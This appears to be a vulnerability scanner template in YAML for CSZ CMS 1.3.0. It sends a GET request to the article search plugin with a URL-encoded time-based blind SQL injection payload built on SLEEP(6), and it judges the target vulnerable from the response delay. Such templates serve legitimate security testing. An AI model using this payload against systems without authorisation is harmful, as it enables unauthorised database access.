http:
- matchers:
  - condition: and
    dsl:
    - duration>=6
    - status_code == 200
    - contains(body, "CSZ CMS")
    type: dsl
  raw:
  - '@timeout: 20s

    GET /csz-cms/plugin/article/search?p=3D1%27%22)%20AND%20(SELECT%203910%20FROM%20(SELECT(SLEEP(6)))qIap)--%20ogLS
    HTTP/1.1

    Host: {{Hostname}}

    '
id: csz-cms-sqli
info:
  author: r3Y3r53
  description: 'CSZ CMS version 1.3.0 suffers from multiple remote blind SQL injection
    vulnerabilities.

    '
  metadata:
    max-request: 1
    verified: true
  name: CSZ CMS 1.3.0 - SQL Injection
  reference:
  - https://packetstormsecurity.com/files/167028/CSZ-CMS-1.3.0-SQL-Injection.html
  severity: high
  tags: time-based-sqli,packetstorm,sqli,csz,cms,vuln
